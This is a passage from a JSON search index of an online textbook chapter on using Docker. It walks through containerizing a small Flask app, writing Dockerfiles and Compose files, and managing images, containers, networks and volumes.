Concepts\n\nImage: A lightweight, standalone, executable package that includes everything needed to run a piece of software, including the code, runtime, libraries, and dependencies.\nContainer: A runnable instance of an image. You can create, start, stop, move, and delete a container using the Docker API or CLI.\nDockerfile: A text file that contains a series of instructions on how to build a Docker image.\n\n\n\n\n22.1.9 Containerizing a Python Application\nLet’s create a simple Python application and containerize it using Docker.\n\n22.1.9.1 Step 1: Create a Simple Python Application\nCreate a directory for your project and add a Python script:\nmkdir docker-python-app\ncd docker-python-app\nCreate a file named app.py with the following content:\n# app.py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, Docker!'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\nCreate a requirements.txt file with the following content:\nflask\n\n\n22.1.9.2 Step 2: Create a Dockerfile\nCreate a file named Dockerfile in the project directory with the following content:\n# Use the official Python image from the Docker Hub\nFROM python:3.9-slim\n\n# Set the working directory in the container\nWORKDIR /app\n\n# Copy the current directory contents into the container at /app\nCOPY . /app\n\n# Install the required packages\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Make port 5000 available to the world outside this container\nEXPOSE 5000\n\n# Define the command to run the application\nCMD [\"python\", \"app.py\"]\n\n\n22.1.9.3 Step 3: Build the Docker Image\nOpen a terminal, navigate to your project directory, and run the following command to build the Docker image:\ndocker build -t docker-python-app .\n\n\n22.1.9.4 Step 4: Run the Docker Container\nRun the following command to start a container from the image you built:\ndocker run -d -p 5000:5000 docker-python-app\nThis command runs the container in detached mode (-d) and maps port 5000 on your host to port 5000 in the container (-p 5000:5000).\n\n\n22.1.9.5 Step 5: Test the Application\nOpen a web browser and go to http://localhost:5000. You should see the message “Hello, Docker!”.\n\n\n\n22.1.10 Managing Docker Containers\n\n22.1.10.1 List Running Containers\nTo list all running containers, use the following command:\ndocker ps\n\n\n22.1.10.2 Stop a Container\nTo stop a running container, use the docker stop command followed by the container ID or name:\ndocker stop &lt;container_id&gt;\n\n\n22.1.10.3 Remove a Container\nTo remove a container, use the docker rm command followed by the container ID or name:\ndocker rm &lt;container_id&gt;\n\n\n\n22.1.11 Docker Compose\nDocker Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration.\n\n22.1.11.1 Step 1: Create a docker-compose.yml File\nCreate a file named docker-compose.yml in your project directory with the following content:\nversion: '3'\nservices:\n  web:\n    build: .\n    ports:\n      - \"5000:5000\"\n\n\n22.1.11.2 Step 2: Run Docker Compose\nRun the following command to start the application:\ndocker-compose up\nThis command builds the image (if it hasn’t been built already) and starts the services defined in the docker-compose.yml file.\n\n\n22.1.11.3 Step 3: Stop Docker Compose\nTo stop the application, run:\ndocker-compose down\n\n\n\n22.1.12 Conclusion\nDocker simplifies the process of developing, shipping, and running applications by using containerization. By containerizing your Python application, you ensure it runs consistently across different environments. Docker Compose further simplifies managing multi-container applications. Mastering Docker can greatly enhance your development workflow, making your applications more portable, scalable, and easier to manage.",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#table-of-contents",
    "href": "A2_docker.html#table-of-contents",
    "title": "22  Using Docker",
    "section": "23.1 Table of Contents",
    "text": "23.1 Table of Contents\n\nIntroduction to Docker\nInstalling Docker\nBasic Docker Concepts\nWorking with Docker Images\nCreating and Running Docker Containers\nDocker Networking\nDocker Volumes\nDocker Compose\nDockerfile: Building Custom Images\nBest Practices and Tips\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#introduction-to-docker",
    "href": "A2_docker.html#introduction-to-docker",
    "title": "22  Using Docker",
    "section": "23.2 Introduction to Docker",
    "text": "23.2 Introduction to Docker\nDocker is a platform that allows developers to automate the deployment of applications inside lightweight, portable containers. Containers include everything needed to run an application, making it easy to deploy on any environment.\n\n23.2.1 Why Use Docker?\n\nConsistency: Ensures that your application runs the same in development, testing, and production.\nIsolation: Provides isolated environments for applications, preventing conflicts.\nEfficiency: Containers are lightweight and share the host OS kernel, making them more efficient than virtual machines.\nPortability: Containers can run anywhere, from your local machine to cloud environments.",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#installing-docker-2",
    "href": "A2_docker.html#installing-docker-2",
    "title": "22  Using Docker",
    "section": "23.3 Installing Docker",
    "text": "23.3 Installing Docker\nDocker can be installed on various operating systems, including Windows, macOS, and Linux.\n\n23.3.1 Windows and macOS\n\nDownload Docker Desktop from the Docker website.\nRun the installer and follow the installation instructions.\nAfter installation, Docker Desktop will start automatically. You can check the installation by running:\ndocker --version\n\n\n\n23.3.2 Linux\n\nUpdate your package database:\nsudo apt-get update\nInstall Docker:\nsudo apt-get install docker-ce docker-ce-cli containerd.io\nVerify the installation:\nsudo docker --version",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#basic-docker-concepts",
    "href": "A2_docker.html#basic-docker-concepts",
    "title": "22  Using Docker",
    "section": "23.4 Basic Docker Concepts",
    "text": "23.4 Basic Docker Concepts\n\n23.4.1 Docker Images\nA Docker image is a lightweight, standalone, and executable software package that includes everything needed to run a piece of software, including code, runtime, libraries, environment variables, and configuration files.\n\n\n23.4.2 Docker Containers\nA Docker container is a runtime instance of an image. It includes the application and all its dependencies but shares the kernel with other containers, running as isolated processes on the host operating system.\n\n\n23.4.3 Docker Hub\nDocker Hub is a cloud-based registry service for finding and sharing container images. You can use Docker Hub to distribute your images.",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#working-with-docker-images",
    "href": "A2_docker.html#working-with-docker-images",
    "title": "22  Using Docker",
    "section": "23.5 Working with Docker Images",
    "text": "23.5 Working with Docker Images\n\n23.5.1 Pulling an Image\nTo pull an image from Docker Hub, use the docker pull command:\ndocker pull hello-world\n\n\n23.5.2 Listing Images\nTo list all downloaded images, use the docker images command:\ndocker images\n\n\n23.5.3 Removing an Image\nTo remove an image, use the docker rmi command followed by the image ID or name:\ndocker rmi hello-world",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#creating-and-running-docker-containers",
    "href": "A2_docker.html#creating-and-running-docker-containers",
    "title": "22  Using Docker",
    "section": "23.6 Creating and Running Docker Containers",
    "text": "23.6 Creating and Running Docker Containers\n\n23.6.1 Running a Container\nTo create and run a container from an image, use the docker run command:\ndocker run hello-world\nThis command will create a new container from the hello-world image and run it.\n\n\n23.6.2 Listing Containers\nTo list all running containers, use the docker ps command:\ndocker ps\nTo list all containers (running and stopped), use:\ndocker ps -a\n\n\n23.6.3 Stopping a Container\nTo stop a running container, use the docker stop command followed by the container ID or name:\ndocker stop &lt;container_id&gt;\n\n\n23.6.4 Removing a Container\nTo remove a stopped container, use the docker rm command followed by the container ID or name:\ndocker rm &lt;container_id&gt;",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#docker-networking",
    "href": "A2_docker.html#docker-networking",
    "title": "22  Using Docker",
    "section": "23.7 Docker Networking",
    "text": "23.7 Docker Networking\nDocker provides several networking options to manage communication between containers.\n\n23.7.1 Bridge Network\nThe default network for containers. Containers on the same bridge network can communicate with each other.\ndocker network ls\ndocker network create my-bridge-network\ndocker run --network my-bridge-network --name my-container my-image\n\n\n23.7.2 Host Network\nUses the host’s network stack directly.\ndocker run --network host my-image\n\n\n23.7.3 Overlay Network\nUsed for multi-host networking in a Docker Swarm cluster.\ndocker network create -d overlay my-overlay-network",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#docker-volumes",
    "href": "A2_docker.html#docker-volumes",
    "title": "22  Using Docker",
    "section": "23.8 Docker Volumes",
    "text": "23.8 Docker Volumes\nVolumes are used to persist data generated by and used by Docker containers.\n\n23.8.1 Creating a Volume\ndocker volume create my-volume\n\n\n23.8.2 Using a Volume\nMount a volume to a container:\ndocker run -v my-volume:/app/data my-image\n\n\n23.8.3 Listing Volumes\ndocker volume ls\n\n\n23.8.4 Removing a Volume\ndocker volume rm my-volume",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#docker-compose-2",
    "href": "A2_docker.html#docker-compose-2",
    "title": "22  Using Docker",
    "section": "23.9 Docker Compose",
    "text": "23.9 Docker Compose\nDocker Compose is a tool for defining and running multi-container Docker applications.\n\n23.9.1 Creating a docker-compose.yml File\nversion: '3'\nservices:\n  web:\n    image: nginx\n    ports:\n      - \"80:80\"\n  db:\n    image: postgres\n    environment:\n      POSTGRES_PASSWORD: example\n\n\n23.9.2 Running Docker Compose\ndocker-compose up\n\n\n23.9.3 Stopping Docker Compose\ndocker-compose down",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#dockerfile-building-custom-images",
    "href": "A2_docker.html#dockerfile-building-custom-images",
    "title": "22  Using Docker",
    "section": "23.10 Dockerfile: Building Custom Images",
    "text": "23.10 Dockerfile: Building Custom Images\nA Dockerfile is a text document that contains instructions for building a Docker image.\n\n23.10.1 Example Dockerfile\n# Use an official Python runtime as a parent image\nFROM python:3.8-slim\n\n# Set the working directory\nWORKDIR /app\n\n# Copy the current directory contents into the container\nCOPY . /app\n\n# Install any needed packages specified in requirements.txt\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Make port 80 available to the world outside this container\nEXPOSE 80\n\n# Run app.py when the container launches\nCMD [\"python\", \"app.py\"]\n\n\n23.10.2 Building an Image\ndocker build -t my-python-app .\n\n\n23.10.3 Running the Image\ndocker run -p 4000:80 my-python-app",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#best-practices-and-tips",
    "href": "A2_docker.html#best-practices-and-tips",
    "title": "22  Using Docker",
    "section": "23.11 Best Practices and Tips",
    "text": "23.11 Best Practices and Tips\n\nKeep Images Small: Use smaller base images and clean up unnecessary files to reduce image size.\nMulti-stage Builds: Use multi-stage builds to keep the final image lean and clean.\nUse .dockerignore: Exclude files and directories not needed in the Docker image.\nTag Images Properly: Use meaningful tags for versioning and identifying images.\nMonitor Containers: Use Docker logs and monitoring tools to keep track of container health and performance.",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  },
  {
    "objectID": "A2_docker.html#conclusion-2",
    "href": "A2_docker.html#conclusion-2",
    "title": "22  Using Docker",
    "section": "23.12 Conclusion",
    "text": "23.12 Conclusion\nDocker is a powerful tool for creating, deploying, and managing containerized applications. This tutorial covered the basics of Docker, including images, containers, networking, volumes, Docker Compose, and Dockerfiles. By following these guidelines and best practices, you can effectively use Docker to manage your business analytics and information systems applications. Happy Dockerizing!",
    "crumbs": [
      "<span class='chapter-number'>22</span>  <span class='chapter-title'>Using Docker</span>"
    ]
  }
]